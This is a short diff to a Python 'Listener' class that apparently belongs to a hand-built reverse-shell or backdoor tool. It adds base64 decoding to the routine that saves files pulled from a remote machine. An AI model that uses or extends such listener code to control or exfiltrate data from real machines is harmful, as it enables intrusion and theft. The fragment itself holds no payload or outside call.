@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python 3 - bytes-like object error issue
 
-import json, socket
+import base64, json, socket
 
 class Listener:
     def __init__(self, listen_ip, listen_port): #constructor
@@ -53,7 +53,7 @@ class Listener:
             
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful."
         
             
